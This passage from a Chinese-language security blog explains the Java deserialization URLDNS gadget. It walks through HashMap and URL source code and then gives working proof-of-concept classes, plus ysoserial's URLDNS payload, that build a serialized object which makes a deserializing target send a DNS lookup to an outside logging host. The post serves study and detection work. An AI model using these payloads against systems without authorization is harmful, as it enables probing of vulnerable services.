mappings<span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readInt</span>();<span style="color:#75715e">// Read number of mappings (size)</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (mappings<span style="color:#f92672">&lt;</span> 0)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">"Illegal mappings count: "</span><span style="color:#f92672">+</span></span></span><span style="display:flex;"><span> mappings);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (mappings<span style="color:#f92672">></span> 0) {<span style="color:#75715e">// (if zero, use defaults)</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Size the table using given load factor only if within</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// range of 0.25...4.0</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">float</span> lf<span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">min</span>(Math.<span style="color:#a6e22e">max</span>(0.<span style="color:#a6e22e">25f</span>, loadFactor), 4.<span style="color:#a6e22e">0f</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">float</span> fc<span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)mappings<span style="color:#f92672">/</span> lf<span style="color:#f92672">+</span> 1.<span style="color:#a6e22e">0f</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> cap<span style="color:#f92672">=</span> ((fc<span style="color:#f92672">&lt;</span> DEFAULT_INITIAL_CAPACITY)<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> DEFAULT_INITIAL_CAPACITY :</span></span><span style="display:flex;"><span> (fc<span style="color:#f92672">>=</span> MAXIMUM_CAPACITY)<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> MAXIMUM_CAPACITY :</span></span><span style="display:flex;"><span> tableSizeFor((<span style="color:#66d9ef">int</span>)fc));</span></span><span style="display:flex;"><span><span style="color:#66d9ef">float</span> ft<span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)cap<span style="color:#f92672">*</span> lf;</span></span><span style="display:flex;"><span> threshold<span style="color:#f92672">=</span> ((cap<span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY<span style="color:#f92672">&amp;&amp;</span> ft<span style="color:#f92672">&lt;</span> MAXIMUM_CAPACITY)<span style="color:#f92672">?</span></span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">int</span>)ft : Integer.<span style="color:#a6e22e">MAX_VALUE</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Check Map.Entry[].class since it's the nearest public type to</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// what we're actually creating.</span></span></span><span style="display:flex;"><span> SharedSecrets.<span style="color:#a6e22e">getJavaObjectInputStreamAccess</span>().<span style="color:#a6e22e">checkArray</span>(s, Map.<span style="color:#a6e22e">Entry</span><span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>, cap);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>({<span style="color:#e6db74">"rawtypes"</span>,<span style="color:#e6db74">"unchecked"</span>})</span></span><span style="display:flex;"><span> Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">>[]</span> tab<span style="color:#f92672">=</span> (Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">>[]</span>)<span style="color:#66d9ef">new</span> Node<span style="color:#f92672">[</span>cap<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span> table<span style="color:#f92672">=</span> tab;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> 0; i<span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">"unchecked"</span>)</span></span><span style="display:flex;"><span> K key<span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">"unchecked"</span>)</span></span><span style="display:flex;"><span> V value<span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> putVal(hash(key), key, value,<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">false</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>可以知道，readObject方法会获取有多少个数据，而后进行通过for循环循环从数据流中读取对象信息，并通过putVal方法加入到HashMap中，其中键为<code>hash(key)</code>，也就是会尝试调用key对应类的hashCode方法计算hash值。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">hash</span>(Object key) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> h;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (key<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>)<span style="color:#f92672">?</span> 0 : (h<span style="color:#f92672">=</span> key.<span style="color:#a6e22e">hashCode</span>())<span style="color:#f92672">^</span> (h<span style="color:#f92672">>>></span> 16);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>如果key对象为URL类，通过前面我们知道URL.hashCode方法会触发DNS请求，这也是URLDNS的原理。</p><p><em>以上代码来源于JDK 12.0.1</em></p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1167574" target="_blank">https://cloud.tencent.com/developer/article/1167574</a></p><p><a href="https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3" target="_blank">https://anmolsehgal.medium.com/java-hashmap-internal-implementation-21597e1efec3</a></p></blockquote><p><strong>实际测试</strong></p><p>使用如下代码进行测试</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">urltest</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {</span></span><span style="display:flex;"><span> System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">"hello "</span>);</span></span><span style="display:flex;"><span> URL u<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://www.baidu.com/1"</span>);</span></span><span style="display:flex;"><span> URL u1<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://www.aliyun.com/1"</span>);</span></span><span style="display:flex;"><span> HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">></span> map<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">></span>();</span></span><span style="display:flex;"><span> map.<span style="color:#a6e22e">put</span>(u,<span style="color:#e6db74">"1"</span>);</span></span><span style="display:flex;"><span> map.<span style="color:#a6e22e">put</span>(u1,<span style="color:#e6db74">"1"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> FileOutputStream fos<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">"object"</span>);</span></span><span style="display:flex;"><span> ObjectOutputStream os<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectOutputStream(fos);</span></span><span style="display:flex;"><span><span style="color:#75715e">//writeObject()方法将myObj对象写入object文件</span></span></span><span style="display:flex;"><span> os.<span style="color:#a6e22e">writeObject</span>(map);</span></span><span style="display:flex;"><span> os.<span style="color:#a6e22e">close</span>();</span></span><span style="display:flex;"><span><span style="color:#75715e">//从文件中反序列化obj对象</span></span></span><span style="display:flex;"><span> FileInputStream fis<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">"object"</span>);</span></span><span style="display:flex;"><span> ObjectInputStream ois<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectInputStream(fis);</span></span><span style="display:flex;"><span><span style="color:#75715e">//恢复对象</span></span></span><span style="display:flex;"><span> HashMap map2<span style="color:#f92672">=</span> (HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">></span>)ois.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">"finish"</span>);</span></span><span style="display:flex;"><span> ois.<span style="color:#a6e22e">close</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>实际测试在从文件中反序列化恢复HashMap对象时不会触发DNS查询，跟进HashMap的readObject，有如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> 0; i<span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">"unchecked"</span>)</span></span><span style="display:flex;"><span> K key<span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">"unchecked"</span>)</span></span><span style="display:flex;"><span> V value<span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> putVal(hash(key), key, value,<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">false</span>);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>其中对K尝试调用readObject方法反序列化出对应的对象，其会调用到URL类的readObject方法，可以看到URL的readObject方法会尝试读取到hashCode并放入对象的hashCode属性</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">synchronized</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {</span></span><span style="display:flex;"><span> GetField gf<span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readFields</span>();</span></span><span style="display:flex;"><span> String protocol<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"protocol"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (getURLStreamHandler(protocol)<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IOException(<span style="color:#e6db74">"unknown protocol: "</span><span style="color:#f92672">+</span> protocol);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> String host<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"host"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> port<span style="color:#f92672">=</span> gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"port"</span>,<span style="color:#f92672">-</span>1);</span></span><span style="display:flex;"><span> String authority<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"authority"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span> String file<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"file"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span> String ref<span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"ref"</span>,<span style="color:#66d9ef">null</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> hashCode<span style="color:#f92672">=</span> gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"hashCode"</span>,<span style="color:#f92672">-</span>1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (authority<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span></span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;&amp;</span> ((host<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#f92672">!</span>host.<span style="color:#a6e22e">isEmpty</span>())<span style="color:#f92672">||</span> port<span style="color:#f92672">!=</span><span style="color:#f92672">-</span>1)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (host<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> host<span style="color:#f92672">=</span><span style="color:#e6db74">""</span>;</span></span><span style="display:flex;"><span> authority<span style="color:#f92672">=</span> (port<span style="color:#f92672">==</span><span style="color:#f92672">-</span>1)<span style="color:#f92672">?</span> host : host<span style="color:#f92672">+</span><span style="color:#e6db74">":"</span><span style="color:#f92672">+</span> port;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> tempState<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> UrlDeserializedState(protocol, host, port, authority,</span></span><span style="display:flex;"><span> file, ref, hashCode);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而在序列化时，会调用HashMap.put方法，put方法会跟前面一样，调用hash方法计算hashCode，并放到对象内，序列化时hashCode就被保存了。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> V<span style="color:#a6e22e">put</span>(K key, V value) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> putVal(hash(key), key, value,<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>使得在调用URL.readObject方法时能够获取到hashCode，不会进行DNS解析。要解决这个问题就得让序列化后的数据hashCode为-1才能让hashCode方法调用到getHostAddress方法。
容易想到两种办法</p><ol><li>在put后，修改数据，把hashCode对应的数据置为-1，而后进行序列化</li><li>在数据放入HashMap时，通过反射直接调用putVal并把第一个参数设为-1
以下是两种办法的实现，<a href="https://su18.org/post/ysoserial-su18-1/?#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">来源于</a></li></ol><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">URLDNS</span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">></span> hashMap<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;></span>();</span></span><span style="display:flex;"><span> URL url<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://su18.dnslog.cn"</span>);</span></span><span style="display:flex;"><span> Field f<span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"java.net.URL"</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">"hashCode"</span>);</span></span><span style="display:flex;"><span> f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> f.<span style="color:#a6e22e">set</span>(url, 0x01010101);</span></span><span style="display:flex;"><span> hashMap.<span style="color:#a6e22e">put</span>(url, 0);</span></span><span style="display:flex;"><span> f.<span style="color:#a6e22e">set</span>(url,<span style="color:#f92672">-</span>1);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ObjectOutputStream oos<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">"urldns.bin"</span>));</span></span><span style="display:flex;"><span> oos.<span style="color:#a6e22e">writeObject</span>(hashMap);</span></span><span style="display:flex;"><span> ObjectInputStream ois<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">"urldns.bin"</span>));</span></span><span style="display:flex;"><span> ois.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">URLDNS2</span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">></span> hashMap<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;></span>();</span></span><span style="display:flex;"><span> URL url<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://su18.dnslog.cn"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> Method<span style="color:#f92672">[]</span> m<span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"java.util.HashMap"</span>).<span style="color:#a6e22e">getDeclaredMethods</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (Method method : m) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (method.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">"putVal"</span>)) {</span></span><span style="display:flex;"><span> method.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> method.<span style="color:#a6e22e">invoke</span>(hashMap,<span style="color:#f92672">-</span>1, url, 0,<span style="color:#66d9ef">false</span>,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ObjectOutputStream oos<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">"urldns2.bin"</span>));</span></span><span style="display:flex;"><span> oos.<span style="color:#a6e22e">writeObject</span>(hashMap);</span></span><span style="display:flex;"><span> ObjectInputStream ois<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">"urldns2.bin"</span>));</span></span><span style="display:flex;"><span> ois.<span style="color:#a6e22e">readObject</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h4 id="ysoserial-实现url-dns">ysoserial 实现URL DNS</h4><p>下载<a href="https://github.com/frohoff/ysoserial" target="_blank">源码</a>,URLDNS实现如下，很明显采用的时第一种方法，在put之后，通过反射修改对应的值。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">URLDNS</span><span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String url)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">//Avoid DNS resolution during payload creation</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//Since the field &lt;code>java.net.URL.handler&lt;/code> is transient, it will not be part of the serialized payload.</span></span></span><span style="display:flex;"><span> URLStreamHandler handler<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> SilentURLStreamHandler();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> HashMap ht<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap();<span style="color:#75715e">// HashMap that will contain the URL</span></span></span><span style="display:flex;"><span> URL u<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#66d9ef">null</span>, url, handler);<span style="color:#75715e">// URL to use as the Key</span></span></span><span style="display:flex;"><span> ht.<span style="color:#a6e22e">put</span>(u, url);<span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(u,<span style="color:#e6db74">"hashCode"</span>,<span style="color:#f92672">-</span>1);<span style="color:#75715e">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ht;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">final</span> String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span> PayloadRunner.<span style="color:#a6e22e">run</span>(URLDNS.<span style="color:#a6e22e">class</span>, args);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/**</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * &lt;p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * using the serialized object.&lt;/p></span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * &lt;b>Potential false negative:&lt;/b></span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * &lt;p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * second resolution.&lt;/p></span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">SilentURLStreamHandler</span><span style="color:#66d9ef">extends</span> URLStreamHandler {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> URLConnection<span style="color:#a6e22e">openConnection</span>(URL u)<span style="color:#66d9ef">throws</span> IOException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">synchronized</span> InetAddress<span style="color:#a6e22e">getHostAddress</span>(URL u) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">setFieldValue</span>(<span style="color:#66d9ef">final</span> Object obj,<span style="color:#66d9ef">final</span> String fieldName,<span style="color:#66d9ef">final</span> Object value)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Field field<span style="color:#f92672">=</span> getField(obj.<span style="color:#a6e22e">getClass</span>(), fieldName);</span></span><span style="display:flex;"><span> field.<span style="color:#a6e22e">set</span>(obj, value);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><strong>参考链接</strong></p><blockquote><p><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a></p><p><a href="https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90</a></p></blockquote><p><strong>Created at 2024-01-08T16:57:37+08:00</strong></p></description></item></channel></rss>